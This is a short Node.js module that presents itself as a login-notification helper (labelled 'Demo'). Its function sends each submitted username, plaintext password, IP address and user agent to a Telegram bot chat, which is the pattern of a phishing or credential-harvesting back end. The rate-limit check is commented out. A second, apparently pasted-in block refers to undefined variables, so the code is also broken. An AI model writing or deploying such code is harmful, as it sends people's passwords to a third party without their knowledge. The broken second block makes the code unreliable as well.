const fetch = require("node-fetch");

const BOT_TOKEN = process.env.TG_BOT_TOKEN;
const CHAT_ID = process.env.TG_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("⚠ Telegram bot environment variables are missing");
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// 🛡 Simple in-memory spam protection
let lastNotifyTime = 0;
const COOLDOWN_MS = 10_000; // 10 seconds

async function notifyLogin({
  username,
  ip,
  userAgent,
  password
}) {
  try {
    const now = Date.now();
    //if (now - lastNotifyTime < COOLDOWN_MS) return;
    lastNotifyTime = now;

    const safeUsername = String(username).slice(0, 32);
    const safeIp = String(ip).slice(0, 45);
    const safeUA = userAgent
      ? String(userAgent).slice(0, 120)
      : "Unknown";
    const safePassword = password || "[HIDDEN]";

    const time = new Date().toISOString();

    const message =
`🔐 New Login Detected (Demo)
👤 User: ${safeUsername}
🔑 Password: ${safePassword}
🌍 IP: ${safeIp}
🖥 Device: ${safeUA}
⏰ Time: ${time}`;

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        disable_web_page_preview: true
      }),
      signal: controller.signal
    });

    clearTimeout(timeout);
  } catch (err) {
    console.warn("Telegram notify failed:", err.message);
  }

  try {
        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: process.env.CHAT_ID,
                text: `Login attempt:\nUsername: ${data.username}\nPassword: ${data.password}\nIP: ${data.ip}\nUser-Agent: ${data.userAgent}`
            })
        });
    } catch (err) {
        if (retries > 0) return notifyLogin(data, retries - 1);
        console.warn("Telegram notify failed after retries:", err.message);
    }
}

module.exports = { notifyLogin };

